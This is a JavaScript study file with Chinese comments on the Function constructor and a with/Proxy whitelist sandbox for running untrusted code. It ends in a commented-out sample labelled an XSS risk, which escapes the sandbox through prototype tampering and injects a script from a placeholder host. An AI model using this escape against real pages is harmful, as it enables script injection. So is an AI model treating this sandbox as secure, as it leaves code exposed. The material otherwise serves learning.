// ①let func = new Function ( [ arg1, arg2, ...argN], functionBody)，最后一个参数一定是函数体，
// 其余参数都作为传给函数体的参数；
// ②日常开发直接使用 function 或者 () => {} 箭头函数写法就好了；
// ③作用 1：非合法 JSON 对象字符串合法化：JSON.stringify (new Function ('return ' + str)())；
// ④作用 2：模板字符串作为模板：可以扩展字符串方法，无需第三方实现模板渲染效果；
// ⑤作用 3：闭包与上下文：new Function 主体参数中的变量的上下文是全局的，而不是私有的，没有所谓的闭包；

//原网址： https://juejin.cn/post/7124969690958397471#heading-5
//编译代码
function compileCode(code) {
    code = `with(ctx){${code}}`
    return new Function('ctx', code)
}
// 设置可以访问的白名单
const whiteList = ['Math', 'console']
function ctxProxy(ctx) {
    const exposeCtx = new Proxy(ctx, {
        //拦截变量
        has(target, key) {
            //has必须返回布尔值，表示属性是否存在，返回的非布尔值会被转化为布尔值
            // 如果不是自身属性，说明找不到该属性，未避免去上层作用域链查找，抛出异常
            if (whiteList.includes(key)) {
                // 在白名单列表中，往上访问
                return target[key]//undefined
            }
            if (!target.hasOwnProperty(key)) {
                throw new Error(`找不到${key}`)
            }
            return true
        }
    })
    return exposeCtx
}

//上下文
const ctx = {
    ja: (v) => {
        console.log(v);
    },
    foo: 'fjj'
}


// 待执行程序
const code = `
    foo = 'bar'
    console.log(Math.max(1,2))
    console.log(foo)
    ja(foo)
  `;

//由于console是window上的属性，所以会被拦截,加入白名单后就不会被拦截
// const code = `
//     foo = 'bar'
//     ja(foo)
//     console.log(fpp)
//   `;


let exposeCtx = ctxProxy(ctx)
compileCode(code).call(exposeCtx, exposeCtx)

// 利用沙箱执行上下文中对象的某个内部属性，Proxy 只可以拦截对象的一级属性，例如下面的上下文对象，proxy.has 无法监听 a.b 的访问
// 利用这个特性，就可以实现一些邪恶的东西。由于 a.b 属性访问无法监听，可以通过 a.b.__proto__ 获取到对应类型原型(ctx.a.b 为 String 类型)，便可以对原型上的方法进行篡改，例如下面对 toString 方法的篡改就能影响到外部环境。
// 存在XSS风险
// const code = `
//   a.b.__proto__.toString = () => {
//     new (() => {}).constructor(
//       "var script = document.createElement('script');
//       script.src = 'http://xss.js;'
//       script.type = 'text/javascript';
//       document.body.appendChild(script);"
//     )()
//   };